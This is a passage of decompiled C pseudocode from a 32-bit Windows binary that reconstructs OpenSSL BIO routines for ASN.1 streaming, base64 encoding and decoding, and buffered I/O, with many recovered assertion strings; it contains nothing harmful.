  int v4; // eax
  int v5; // ecx
  int v6; // ebp
  int v7; // eax
  int result; // eax
  int v9; // ebx
  int v10; // eax
  bool v11; // cc
  int v12; // eax
  bool v13; // zf
  int v14; // eax
  int v15; // eax
  int v16; // [esp+Ch] [ebp-Ch]
  int v17; // [esp+10h] [ebp-8h]
  _BYTE *v18; // [esp+14h] [ebp-4h] BYREF

  v3 = sub_404FF0((int)a1);
  v4 = sub_405540((int)a1);
  v5 = v4;
  v17 = v4;
  if ( a2 )
  {
    v6 = a3;
    if ( a3 >= 0 && v3 && v4 )
    {
      v7 = *(_DWORD *)v3;
      v16 = 0;
      while ( 2 )
      {
        switch ( v7 )
        {
          case 0:
            if ( !sub_4D8190(
                    (int)a1,
                    (_DWORD *)v3,
                    *(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *))(v3 + 32),
                    1,
                    2) )
              return 0;
            goto LABEL_29;
          case 1:
            v9 = sub_4D80F0((_DWORD *)v3, (int)a1, *(void (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *))(v3 + 36), 2);
            if ( v9 <= 0 )
              goto LABEL_14;
            goto LABEL_29;
          case 2:
            v10 = sub_4328B0(0, v6, *(_DWORD *)(v3 + 28)) - v6;
            v11 = v10 <= *(_DWORD *)(v3 + 8);
            *(_DWORD *)(v3 + 16) = v10;
            if ( !v11 )
              sub_417C70("assertion failed: ctx->buflen <= ctx->bufsize", "crypto\\asn1\\bio_asn1.c", 181);
            v18 = *(_BYTE **)(v3 + 4);
            sub_432CA0(&v18, 0, v6, *(_DWORD *)(v3 + 28), *(_DWORD *)(v3 + 24));
            *(_DWORD *)(v3 + 20) = v6;
            *(_DWORD *)v3 = 3;
            goto LABEL_29;
          case 3:
            v12 = sub_405110(v5, *(_DWORD *)(v3 + 12) + *(_DWORD *)(v3 + 4), *(_DWORD *)(v3 + 16));
            v9 = v12;
            if ( v12 <= 0 )
              goto LABEL_14;
            v13 = *(_DWORD *)(v3 + 16) == v12;
            *(_DWORD *)(v3 + 16) -= v12;
            if ( v13 )
            {
              *(_DWORD *)(v3 + 12) = 0;
              *(_DWORD *)v3 = 4;
            }
            else
            {
              *(_DWORD *)(v3 + 12) += v12;
            }
LABEL_29:
            v7 = *(_DWORD *)v3;
            if ( *(_DWORD *)v3 > 4u )
              goto LABEL_6;
            v5 = v17;
            continue;
          case 4:
            v14 = *(_DWORD *)(v3 + 20);
            if ( v6 <= v14 )
              v14 = v6;
            v15 = sub_405110(v5, a2, v14);
            v9 = v15;
            if ( v15 <= 0 )
              goto LABEL_29;
            *(_DWORD *)(v3 + 20) -= v15;
            v16 += v15;
            a2 += v15;
            v6 -= v15;
            if ( !*(_DWORD *)(v3 + 20) )
              *(_DWORD *)v3 = 2;
            if ( v6 )
              goto LABEL_29;
LABEL_14:
            sub_405010((int)a1, 15);
            sub_405580(a1);
            result = v16;
            if ( v16 <= 0 )
              return v9;
            return result;
          default:
LABEL_6:
            sub_405010((int)a1, 15);
            return 0;
        }
      }
    }
  }
  return 0;
}

//----- (004D8680) --------------------------------------------------------
int __cdecl sub_4D8680(_DWORD *a1, const char *a2)
{
  return sub_4D84A0(a1, (int)a2, strlen(a2));
}

//----- (004D86B0) --------------------------------------------------------
int __cdecl sub_4D86B0(int a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // esi
  void *v3; // eax

  v1 = sub_413430(0xA00u);
  v2 = v1;
  if ( !v1 )
    return 0;
  v1[6] = 1;
  v1[5] = 1;
  v3 = sub_4303F0();
  v2[7] = v3;
  if ( !v3 )
  {
    sub_413490(v2);
    return 0;
  }
  sub_404FE0(a1, (int)v2);
  sub_405000(a1, 1);
  return 1;
}

//----- (004D8720) --------------------------------------------------------
int __cdecl sub_4D8720(int a1)
{
  int result; // eax
  void *v2; // esi

  if ( !a1 )
    return 0;
  result = sub_404FF0(a1);
  v2 = (void *)result;
  if ( result )
  {
    sub_430410(*(void **)(result + 28));
    sub_413490(v2);
    sub_404FE0(a1, 0);
    sub_405000(a1, 0);
    return 1;
  }
  return result;
}

//----- (004D8780) --------------------------------------------------------
int __cdecl sub_4D8780(_DWORD *a1, char *a2, int a3)
{
  int result; // eax
  int v4; // esi
  int v5; // eax
  signed int v6; // edi
  int v7; // ebx
  int v8; // eax
  int v9; // edi
  int v10; // ebx
  unsigned __int8 *v11; // edi
  unsigned __int8 *v12; // ebp
  char v13; // dl
  int i; // eax
  int v15; // ebp
  int j; // eax
  unsigned int v17; // edi
  int v18; // eax
  size_t v19; // ebx
  size_t v20; // edi
  _DWORD *v21; // [esp-Ch] [ebp-24h]
  int v22; // [esp+4h] [ebp-14h]
  int v23; // [esp+8h] [ebp-10h]
  int v24; // [esp+8h] [ebp-10h]
  int v25; // [esp+Ch] [ebp-Ch] BYREF
  int v26; // [esp+10h] [ebp-8h]
  int v27; // [esp+14h] [ebp-4h]

  v22 = 0;
  if ( !a2 )
    return 0;
  v4 = sub_404FF0((int)a1);
  v5 = sub_405540((int)a1);
  v27 = v5;
  if ( !v4 || !v5 )
    return 0;
  sub_405010((int)a1, 15);
  if ( *(_DWORD *)(v4 + 16) != 2 )
  {
    *(_DWORD *)(v4 + 16) = 2;
    v21 = *(_DWORD **)(v4 + 28);
    *(_DWORD *)v4 = 0;
    *(_DWORD *)(v4 + 4) = 0;
    *(_DWORD *)(v4 + 8) = 0;
    sub_430540(v21);
  }
  if ( *(int *)v4 <= 0 )
  {
    v7 = a3;
  }
  else
  {
    if ( *(_DWORD *)v4 < *(_DWORD *)(v4 + 4) )
      sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 134);
    v6 = *(_DWORD *)v4 - *(_DWORD *)(v4 + 4);
    if ( v6 > a3 )
      v6 = a3;
    if ( v6 + *(_DWORD *)(v4 + 4) >= 1502 )
      sub_417C70("assertion failed: ctx->buf_off + i < (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 138);
    memcpy(a2, (const void *)(v4 + *(_DWORD *)(v4 + 4) + 32), v6);
    *(_DWORD *)(v4 + 4) += v6;
    a2 += v6;
    v7 = a3 - v6;
    v22 = v6;
    a3 -= v6;
    if ( *(_DWORD *)v4 == *(_DWORD *)(v4 + 4) )
    {
      *(_DWORD *)v4 = 0;
      *(_DWORD *)(v4 + 4) = 0;
    }
  }
  v26 = 0;
  if ( v7 <= 0 )
    goto LABEL_74;
  while ( 2 )
  {
    if ( *(int *)(v4 + 24) <= 0 )
      goto LABEL_74;
    v8 = sub_405040(v27, *(_DWORD *)(v4 + 8) + v4 + 1534, 1024 - *(_DWORD *)(v4 + 8));
    v9 = v8;
    if ( v8 <= 0 )
    {
      v26 = v8;
      if ( sub_405020(v27, 8) )
        goto LABEL_74;
      *(_DWORD *)(v4 + 24) = v9;
      if ( !*(_DWORD *)(v4 + 8) )
        goto LABEL_74;
      v9 = 0;
    }
    *(_DWORD *)(v4 + 8) += v9;
    v10 = *(_DWORD *)(v4 + 8);
    if ( !*(_DWORD *)(v4 + 20) )
      goto LABEL_55;
    if ( (sub_405020((int)a1, -1) & 0x100) != 0 )
    {
      *(_DWORD *)(v4 + 8) = 0;
      goto LABEL_56;
    }
    if ( !*(_DWORD *)(v4 + 20) )
    {
LABEL_55:
      if ( v10 < 1024 && *(int *)(v4 + 24) > 0 )
        goto LABEL_47;
      goto LABEL_56;
    }
    v11 = (unsigned __int8 *)(v4 + 1534);
    v12 = (unsigned __int8 *)(v4 + 1534);
    v25 = 0;
    v23 = 0;
    if ( v10 <= 0 )
      goto LABEL_42;
    while ( 1 )
    {
      v13 = *v12++;
      if ( v13 == 10 )
        break;
LABEL_36:
      if ( ++v23 >= v10 )
        goto LABEL_42;
    }
    if ( *(_DWORD *)(v4 + 12) )
    {
      *(_DWORD *)(v4 + 12) = 0;
LABEL_35:
      v11 = v12;
      goto LABEL_36;
    }
    if ( sub_430890(*(int **)(v4 + 28), (_BYTE *)(v4 + 32), &v25, v11, v12 - v11) <= 0 && !v25 && *(_DWORD *)(v4 + 20) )
    {
      sub_430540(*(_DWORD **)(v4 + 28));
      goto LABEL_35;
    }
    if ( v11 != (unsigned __int8 *)(v4 + 1534) )
    {
      v10 += v4 - (_DWORD)v11 + 1534;
      for ( i = 0; i < v10; ++i )
        *(_BYTE *)(v4 + 1534 + i) = v11[i];
    }
    sub_430540(*(_DWORD **)(v4 + 28));
    *(_DWORD *)(v4 + 20) = 0;
LABEL_42:
    if ( v23 == v10 && !v25 )
    {
      if ( v11 == (unsigned __int8 *)(v4 + 1534) )
      {
        if ( v10 == 1024 )
        {
          *(_DWORD *)(v4 + 12) = 1;
          *(_DWORD *)(v4 + 8) = 0;
        }
      }
      else if ( v11 != v12 )
      {
        v15 = v12 - v11;
        for ( j = 0; j < v15; ++j )
          *(_BYTE *)(v4 + 1534 + j) = v11[j];
        *(_DWORD *)(v4 + 8) = v15;
      }
LABEL_47:
      if ( a3 <= 0 )
        goto LABEL_74;
      continue;
    }
    break;
  }
  *(_DWORD *)(v4 + 8) = 0;
LABEL_56:
  if ( (sub_405020((int)a1, -1) & 0x100) != 0 )
  {
    v17 = v10 & 0xFFFFFFFC;
    v18 = sub_430560((_BYTE *)(v4 + 32), (char *)(v4 + 1534), v10 & 0xFFFFFFFC);
    v24 = v18;
    if ( (int)(v10 & 0xFFFFFFFC) > 2 && *(_BYTE *)(v17 + v4 + 1533) == 61 )
    {
      v24 = --v18;
      if ( *(_BYTE *)(v17 + v4 + 1532) == 61 )
        v24 = --v18;
    }
    if ( v17 != v10 )
    {
      v19 = v10 - v17;
      memcpy_0((void *)(v4 + 1534), (const void *)(v17 + v4 + 1534), v19);
      v18 = v24;
      *(_DWORD *)(v4 + 8) = v19;
    }
    *(_DWORD *)v4 = 0;
    if ( v18 > 0 )
      *(_DWORD *)v4 = v18;
  }
  else
  {
    v18 = sub_430890(*(int **)(v4 + 28), (_BYTE *)(v4 + 32), (_DWORD *)v4, (unsigned __int8 *)(v4 + 1534), v10);
    *(_DWORD *)(v4 + 8) = 0;
  }
  *(_DWORD *)(v4 + 4) = 0;
  if ( v18 >= 0 )
  {
    v20 = *(_DWORD *)v4;
    if ( *(_DWORD *)v4 > a3 )
      v20 = a3;
    memcpy(a2, (const void *)(v4 + 32), v20);
    v22 += v20;
    *(_DWORD *)(v4 + 4) = v20;
    if ( v20 == *(_DWORD *)v4 )
    {
      *(_DWORD *)v4 = 0;
      *(_DWORD *)(v4 + 4) = 0;
    }
    a2 += v20;
    a3 -= v20;
    goto LABEL_47;
  }
  v26 = 0;
  *(_DWORD *)v4 = 0;
LABEL_74:
  sub_405580(a1);
  result = v22;
  if ( !v22 )
    return v26;
  return result;
}

//----- (004D8B70) --------------------------------------------------------
int __cdecl sub_4D8B70(_DWORD *a1, char *Src, signed int Size)
{
  _DWORD *v3; // ebx
  int v4; // esi
  int v5; // eax
  int v6; // ebp
  int v7; // edi
  char *v8; // ebp
  int v9; // edi
  int result; // eax
  int v11; // eax
  int v12; // ebx
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // ebx
  int v18; // eax
  int v19; // edi
  _DWORD *v20; // [esp-4h] [ebp-1Ch]
  int v21; // [esp+10h] [ebp-8h]
  int v22; // [esp+14h] [ebp-4h]

  v3 = a1;
  v21 = 0;
  v4 = sub_404FF0((int)a1);
  v5 = sub_405540((int)a1);
  v6 = v5;
  v22 = v5;
  if ( !v4 || !v5 )
    return 0;
  sub_405010((int)a1, 15);
  if ( *(_DWORD *)(v4 + 16) != 1 )
  {
    *(_DWORD *)(v4 + 16) = 1;
    v20 = *(_DWORD **)(v4 + 28);
    *(_DWORD *)v4 = 0;
    *(_DWORD *)(v4 + 4) = 0;
    *(_DWORD *)(v4 + 8) = 0;
    sub_430430(v20);
  }
  if ( *(int *)(v4 + 4) >= 1502 )
    sub_417C70("assertion failed: ctx->buf_off < (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 340);
  if ( *(int *)v4 > 1502 )
    sub_417C70("assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 341);
  if ( *(_DWORD *)v4 < *(_DWORD *)(v4 + 4) )
    sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 342);
  v7 = *(_DWORD *)v4 - *(_DWORD *)(v4 + 4);
  if ( v7 > 0 )
  {
    while ( 1 )
    {
      v11 = sub_405110(v6, *(_DWORD *)(v4 + 4) + v4 + 32, v7);
      v12 = v11;
      if ( v11 <= 0 )
      {
        sub_405580(a1);
        return v12;
      }
      if ( v11 > v7 )
        sub_417C70("assertion failed: i <= n", "crypto\\evp\\bio_b64.c", 350);
      *(_DWORD *)(v4 + 4) += v11;
      if ( *(int *)(v4 + 4) > 1502 )
        sub_417C70("assertion failed: ctx->buf_off <= (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 352);
      if ( *(_DWORD *)v4 < *(_DWORD *)(v4 + 4) )
        sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 353);
      v7 -= v11;
      if ( v7 <= 0 )
        break;
      v6 = v22;
    }
    v3 = a1;
  }
  v8 = Src;
  *(_DWORD *)(v4 + 4) = 0;
  *(_DWORD *)v4 = 0;
  if ( !Src )
    return 0;
  v9 = Size;
  if ( Size <= 0 )
    return 0;
  while ( 1 )
  {
    if ( v9 > 1024 )
      v9 = 1024;
    if ( (sub_405020((int)v3, -1) & 0x100) == 0 )
    {
      if ( !sub_430700(*(unsigned __int8 **)(v4 + 28), (_BYTE *)(v4 + 32), (unsigned int *)v4, v8, v9) )
      {
        result = v21;
        if ( !v21 )
          return -1;
        return result;
      }
      if ( *(int *)v4 > 1502 )
        sub_417C70("assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 410);
      if ( *(_DWORD *)v4 < *(_DWORD *)(v4 + 4) )
        sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 411);
      goto LABEL_52;
    }
    v13 = *(_DWORD *)(v4 + 8);
    if ( v13 <= 0 )
    {
      if ( v9 < 3 )
      {
        memcpy((void *)(v4 + 1534), v8, v9);
        result = v9 + v21;
        *(_DWORD *)(v4 + 8) = v9;
        return result;
      }
      v9 = 3 * (v9 / 3);
      v16 = sub_430450((_BYTE *)(v4 + 32), (unsigned __int8 *)v8, v9);
      *(_DWORD *)v4 = v16;
      if ( v16 > 1502 )
        sub_417C70("assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 401);
      if ( *(_DWORD *)v4 < *(_DWORD *)(v4 + 4) )
        sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 402);
LABEL_52:
      v21 += v9;
      goto LABEL_53;
    }
    if ( v13 > 3 )
      sub_417C70("assertion failed: ctx->tmp_len <= 3", "crypto\\evp\\bio_b64.c", 368);
    v9 = 3 - *(_DWORD *)(v4 + 8);
    if ( v9 > Size )
      v9 = Size;
    memcpy((void *)(*(_DWORD *)(v4 + 8) + v4 + 1534), v8, v9);
    *(_DWORD *)(v4 + 8) += v9;
    v14 = *(_DWORD *)(v4 + 8);
    v21 += v9;
    if ( v14 < 3 )
      return v21;
    v15 = sub_430450((_BYTE *)(v4 + 32), (unsigned __int8 *)(v4 + 1534), v14);
    *(_DWORD *)v4 = v15;
    if ( v15 > 1502 )
      sub_417C70("assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 383);
    if ( *(_DWORD *)v4 < *(_DWORD *)(v4 + 4) )
      sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 384);
    *(_DWORD *)(v4 + 8) = 0;
LABEL_53:
    v17 = *(_DWORD *)v4;
    Size -= v9;
    v8 += v9;
    *(_DWORD *)(v4 + 4) = 0;
    if ( v17 > 0 )
      break;
LABEL_62:
    *(_DWORD *)v4 = 0;
    *(_DWORD *)(v4 + 4) = 0;
    if ( Size <= 0 )
      return v21;
    v3 = a1;
    v9 = Size;
  }
  while ( 1 )
  {
    v18 = sub_405110(v22, *(_DWORD *)(v4 + 4) + v4 + 32, v17);
    v19 = v18;
    if ( v18 <= 0 )
      break;
    if ( v18 > v17 )
      sub_417C70("assertion failed: i <= n", "crypto\\evp\\bio_b64.c", 425);
    *(_DWORD *)(v4 + 4) += v18;
    v17 -= v18;
    if ( *(int *)(v4 + 4) > 1502 )
      sub_417C70("assertion failed: ctx->buf_off <= (int)sizeof(ctx->buf)", "crypto\\evp\\bio_b64.c", 428);
    if ( *(_DWORD *)v4 < *(_DWORD *)(v4 + 4) )
      sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 429);
    if ( v17 <= 0 )
      goto LABEL_62;
  }
  sub_405580(a1);
  result = v21;
  if ( !v21 )
    return v19;
  return result;
}

//----- (004D8FD0) --------------------------------------------------------
int __cdecl sub_4D8FD0(_DWORD *a1, int a2, int a3, int a4)
{
  int v4; // edi
  int v5; // esi
  int v6; // eax
  _DWORD *v7; // ebp
  int v8; // ecx
  int result; // eax
  int v10; // edi
  int v11; // [esp-Ch] [ebp-1Ch]

  v4 = 1;
  v5 = sub_404FF0((int)a1);
  v6 = sub_405540((int)a1);
  v7 = (_DWORD *)v6;
  if ( v5 && v6 )
  {
    v8 = a2;
    switch ( a2 )
    {
      case 1:
        *(_DWORD *)(v5 + 24) = 1;
        *(_DWORD *)(v5 + 20) = 1;
        *(_DWORD *)(v5 + 16) = 0;
        return sub_405390(v7, v8, a3, a4);
      case 2:
        if ( *(int *)(v5 + 24) > 0 )
          return sub_405390(v7, v8, a3, a4);
        return v4;
      case 10:
        if ( *(_DWORD *)v5 < *(_DWORD *)(v5 + 4) )
          sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 472);
        v4 = *(_DWORD *)v5 - *(_DWORD *)(v5 + 4);
        if ( v4 <= 0 )
          return sub_405390(v7, a2, a3, a4);
        return v4;
      case 11:
LABEL_22:
        if ( *(_DWORD *)v5 == *(_DWORD *)(v5 + 4) )
          goto LABEL_25;
        while ( 1 )
        {
          result = sub_4D8B70(a1, 0, 0);
          if ( result < 0 )
            return result;
          if ( *(_DWORD *)v5 == *(_DWORD *)(v5 + 4) )
          {
LABEL_25:
            if ( (sub_405020((int)a1, -1) & 0x100) != 0 )
            {
              if ( *(_DWORD *)(v5 + 8) )
              {
                *(_DWORD *)v5 = sub_430450((_BYTE *)(v5 + 32), (unsigned __int8 *)(v5 + 1534), *(_DWORD *)(v5 + 8));
                *(_DWORD *)(v5 + 4) = 0;
                *(_DWORD *)(v5 + 8) = 0;
                goto LABEL_22;
              }
            }
            else if ( *(_DWORD *)(v5 + 16) && sub_435D30(*(_DWORD *)(v5 + 28)) )
            {
              v11 = *(_DWORD *)(v5 + 28);
              *(_DWORD *)(v5 + 4) = 0;
              sub_430850(v11, (_BYTE *)(v5 + 32), (int *)v5);
              goto LABEL_22;
            }
            return sub_405390(v7, a2, a3, a4);
          }
        }
      case 12:
        return v4;
      case 13:
        if ( *(_DWORD *)v5 < *(_DWORD *)(v5 + 4) )
          sub_417C70("assertion failed: ctx->buf_len >= ctx->buf_off", "crypto\\evp\\bio_b64.c", 463);
        v4 = *(_DWORD *)v5 - *(_DWORD *)(v5 + 4);
        if ( *(_DWORD *)v5 == *(_DWORD *)(v5 + 4) )
        {
          if ( *(_DWORD *)(v5 + 16) != v4 )
          {
            if ( sub_435D30(*(_DWORD *)(v5 + 28)) )
              return 1;
            v8 = a2;
          }
        }
        else if ( v4 > 0 )
        {
          return v4;
        }
        return sub_405390(v7, v8, a3, a4);
      case 101:
        sub_405010((int)a1, 15);
        v10 = sub_405390(v7, a2, a3, a4);
        sub_405580(a1);
        return v10;
      default:
        return sub_405390(v7, v8, a3, a4);
    }
  }
  return 0;
}

//----- (004D9260) --------------------------------------------------------
int __cdecl sub_4D9260(_DWORD *a1, char *Src)
{
  return sub_4D8B70(a1, Src, strlen(Src));
}

//----- (004D9290) --------------------------------------------------------
int __cdecl sub_4D9290(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // esi
  void *v3; // eax
  void *v5; // eax

  v1 = sub_413430(0x20u);
  v2 = v1;
  if ( !v1 )
    return 0;
  *v1 = 4096;
  v3 = sub_4133F0(0x1000u);
  v2[2] = v3;
  if ( !v3 )
  {
    sub_413490(v2);
    return 0;
  }
  v2[1] = 4096;
  v5 = sub_4133F0(0x1000u);
  v2[5] = v5;
  if ( v5 )
  {
    a1[8] = v2;
    a1[3] = 1;
    a1[5] = 0;
    return 1;
  }
  else
  {
    sub_413490((void *)v2[2]);
    sub_413490(v2);
    return 0;
  }
}

//----- (004D9340) --------------------------------------------------------
int __cdecl sub_4D9340(int a1)
{
  int v2; // edi

  if ( !a1 )
    return 0;
  v2 = *(_DWORD *)(a1 + 32);
  sub_413490(*(void **)(v2 + 8));
  sub_413490(*(void **)(v2 + 20));
  sub_413490(*(void **)(a1 + 32));
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  return 1;
}

//----- (004D93B0) --------------------------------------------------------
int __cdecl sub_4D93B0(_DWORD *a1, char *a2, int a3)
{
  int result; // eax
  int *v4; // esi
  signed int v6; // edi
  int v7; // edi
  int v8; // esi
  int v9; // [esp+0h] [ebp-4h]

  if ( !a2 )
    return 0;
  v4 = (int *)a1[8];
  if ( !v4 || !a1[9] )
    return 0;
  v9 = 0;
  sub_405010((int)a1, 15);
  while ( 1 )
  {
    v6 = v4[3];
    if ( v6 )
    {
      if ( v6 > a3 )
        v6 = a3;
      memcpy(a2, (const void *)(v4[4] + v4[2]), v6);
      v4[4] += v6;
      v4[3] -= v6;
      v9 += v6;
      if ( a3 == v6 )
        return v9;
      a3 -= v6;
      a2 += v6;
    }
    if ( a3 > *v4 )
    {
      while ( 1 )
      {
        v8 = sub_405040(a1[9], (int)a2, a3);
        if ( v8 <= 0 )
          break;
        v9 += v8;
        if ( a3 == v8 )
          return v9;
        a2 += v8;
        a3 -= v8;
      }
      sub_405580(a1);
      if ( v8 >= 0 )
        return v9;
      result = v9;
      if ( v9 <= 0 )
        return v8;
      return result;
    }
    v7 = sub_405040(a1[9], v4[2], *v4);
    if ( v7 <= 0 )
      break;
    v4[4] = 0;
    v4[3] = v7;
  }
  sub_405580(a1);
  if ( v7 >= 0 )
    return v9;
  result = v9;
  if ( v9 <= 0 )
    return v7;
  return result;
}
// 4D9464: conditional instruction was optimized away because edi.4==0
// 4D9497: conditional instruction was optimized away because esi.4==0

//----- (004D94E0) --------------------------------------------------------
int __cdecl sub_4D94E0(_DWORD *a1, char *Src, signed int Size)
{
  signed int v3; // ebx
  _DWORD *v4; // esi
  signed int v5; // edi
  int v6; // eax
  int v7; // edi
  bool v8; // zf
  bool v9; // cc
  int result; // eax
  int v11; // [esp+4h] [ebp-4h]

  v11 = 0;
  if ( !Src )
    return 0;
  v3 = Size;
  if ( Size <= 0 )
    return 0;
  v4 = (_DWORD *)a1[8];
  if ( !v4 || !a1[9] )
    return 0;
  sub_405010((int)a1, 15);
  v5 = v4[1] - v4[7] - v4[6];
  if ( v5 >= Size )
  {
LABEL_20:
    memcpy((void *)(v4[6] + v4[7] + v4[5]), Src, v3);
    v4[6] += v3;
    return v11 + v3;
  }
  else
  {
    while ( 1 )
    {
      v6 = v4[6];
      if ( v6 )
      {
        if ( v5 > 0 )
        {
          memcpy((void *)(v6 + v4[7] + v4[5]), Src, v5);
          Src += v5;
          v11 += v5;
          v3 -= v5;
          v4[6] += v5;
        }
        while ( 1 )
        {
          v7 = sub_405110(a1[9], v4[5] + v4[7], v4[6]);
          if ( v7 <= 0 )
            break;
          v4[7] += v7;
          v8 = v4[6] == v7;
          v4[6] -= v7;
          if ( v8 )
            goto LABEL_13;
        }
        sub_405580(a1);
        if ( v7 >= 0 )
          return v11;
        goto LABEL_22;
      }
LABEL_13:
      v9 = v3 < v4[1];
      v4[7] = 0;
      if ( !v9 )
        break;
LABEL_19:
      v5 = v4[1] - v4[7] - v4[6];
      if ( v5 >= v3 )
        goto LABEL_20;
    }
    while ( 1 )
    {
      v7 = sub_405110(a1[9], (int)Src, v3);
      if ( v7 <= 0 )
        break;
      v11 += v7;
      Src += v7;
      v3 -= v7;
      if ( !v3 )
        return v11;
      if ( v3 < v4[1] )
        goto LABEL_19;
    }
    sub_405580(a1);
    if ( v7 >= 0 )
      return v11;
LABEL_22:
    result = v11;
    if ( v11 <= 0 )
      return v7;
  }
  return result;
}
// 4D959F: conditional instruction was optimized away because edi.4==0
// 4D95E5: conditional instruction was optimized away because edi.4==0

//----- (004D9660) --------------------------------------------------------
int __cdecl sub_4D9660(_DWORD *a1, int a2, signed int Size, _DWORD *Src)
{
  int v4; // esi
  int v5; // ebx
  _DWORD *v6; // edi
  bool v7; // zf
  int v9; // ecx
  int v10; // eax
  int v11; // esi
  _BYTE *v12; // eax
  _DWORD *v13; // edi
  void *v14; // ebx
  int v15; // ebp
  void *v16; // edi
  void *v17; // eax
  void *v18; // eax
  int v19; // ebx
  _DWORD *v20; // eax
  void *v21; // [esp-Ch] [ebp-1Ch]
  int v22; // [esp+14h] [ebp+4h]
  void *v23; // [esp+18h] [ebp+8h]

  v4 = a1[8];
  v5 = 1;
  switch ( a2 )
  {
    case 1:
      *(_DWORD *)(v4 + 16) = 0;
      *(_DWORD *)(v4 + 12) = 0;
      *(_DWORD *)(v4 + 28) = 0;
      *(_DWORD *)(v4 + 24) = 0;
      v6 = (_DWORD *)a1[9];
      v7 = v6 == 0;
      goto LABEL_52;
    case 3:
      return *(_DWORD *)(v4 + 24);
    case 10:
      v5 = *(_DWORD *)(v4 + 12);
      if ( v5 )
        return v5;
      v13 = (_DWORD *)a1[9];
      if ( v13 )
        return sub_405390(v13, a2, Size, (int)Src);
      return 0;
    case 11:
      v20 = (_DWORD *)a1[9];
      if ( !v20 )
        return 0;
      if ( *(int *)(v4 + 24) <= 0 )
        return sub_405390(v20, a2, Size, (int)Src);
      sub_405010((int)a1, 15);
      if ( *(int *)(v4 + 24) <= 0 )
        goto LABEL_47;
      break;
    case 12:
      if ( sub_4055E0(Src, 117, *(_DWORD *)v4, 0) && sub_4055E0(Src, 117, *(_DWORD *)(v4 + 4), 1) )
        return v5;
      return 0;
    case 13:
      v5 = *(_DWORD *)(v4 + 24);
      if ( v5 )
        return v5;
      v13 = (_DWORD *)a1[9];
      if ( !v13 )
        return 0;
      return sub_405390(v13, a2, Size, (int)Src);
    case 101:
      if ( !a1[9] )
        return 0;
      sub_405010((int)a1, 15);
      v19 = sub_405390((_DWORD *)a1[9], a2, Size, (int)Src);
      sub_405580(a1);
      return v19;
    case 116:
      v9 = *(_DWORD *)(v4 + 8);
      v5 = 0;
      if ( *(int *)(v4 + 12) <= 0 )
        return v5;
      v10 = *(_DWORD *)(v4 + 16);
      v11 = *(_DWORD *)(v4 + 12);
      v12 = (_BYTE *)(v9 + v10);
      do
      {
        if ( *v12 == 10 )
          ++v5;
        ++v12;
        --v11;
      }
      while ( v11 );
      return v5;
    case 117:
      if ( Src )
      {
        if ( *Src )
        {
          v15 = *(_DWORD *)v4;
          v22 = Size;
        }
        else
        {
          v15 = Size;
          v22 = *(_DWORD *)(v4 + 4);
        }
      }
      else
      {
        v15 = Size;
        v22 = Size;
      }
      v16 = *(void **)(v4 + 8);
      v23 = *(void **)(v4 + 20);
      if ( v15 > 4096 && v15 != *(_DWORD *)v4 )
      {
        v16 = sub_4133F0(Size);
        if ( !v16 )
          goto LABEL_33;
      }
      if ( v22 > 4096 && v22 != *(_DWORD *)(v4 + 4) )
      {
        v23 = sub_4133F0(Size);
        if ( !v23 )
        {
          if ( v16 != *(void **)(v4 + 8) )
            sub_413490(v16);
LABEL_33:
          sub_408310(32, 114, 65, (int)"crypto\\bio\\bf_buff.c", 387);
          return 0;
        }
      }
      v17 = *(void **)(v4 + 8);
      if ( v17 != v16 )
      {
        sub_413490(v17);
        *(_DWORD *)(v4 + 8) = v16;
        *(_DWORD *)(v4 + 16) = 0;
        *(_DWORD *)(v4 + 12) = 0;
        *(_DWORD *)v4 = v15;
      }
      v18 = *(void **)(v4 + 20);
      if ( v18 != v23 )
      {
        sub_413490(v18);
        *(_DWORD *)(v4 + 20) = v23;
        *(_DWORD *)(v4 + 28) = 0;
        *(_DWORD *)(v4 + 24) = 0;
        *(_DWORD *)(v4 + 4) = v22;
        return 1;
      }
      return v5;
    case 122:
      if ( Size <= *(_DWORD *)v4 )
        goto LABEL_19;
      v14 = sub_4133F0(Size);
      if ( !v14 )
        goto LABEL_33;
      sub_413490(*(void **)(v4 + 8));
      *(_DWORD *)(v4 + 8) = v14;
LABEL_19:
      v21 = *(void **)(v4 + 8);
      *(_DWORD *)(v4 + 16) = 0;
      *(_DWORD *)(v4 + 12) = Size;
      memcpy(v21, Src, Size);
      return 1;
    default:
      v6 = (_DWORD *)a1[9];
      v7 = v6 == 0;
LABEL_52:
      if ( v7 )
        return 0;
      return sub_405390(v6, a2, Size, (int)Src);
  }
  while ( 1 )
  {
    v5 = sub_405110(a1[9], *(_DWORD *)(v4 + 28) + *(_DWORD *)(v4 + 20), *(_DWORD *)(v4 + 24));
    sub_405580(a1);
    if ( v5 <= 0 )
      break;
    *(_DWORD *)(v4 + 28) += v5;
    *(_DWORD *)(v4 + 24) -= v5;
    sub_405010((int)a1, 15);
    if ( *(int *)(v4 + 24) <= 0 )
    {
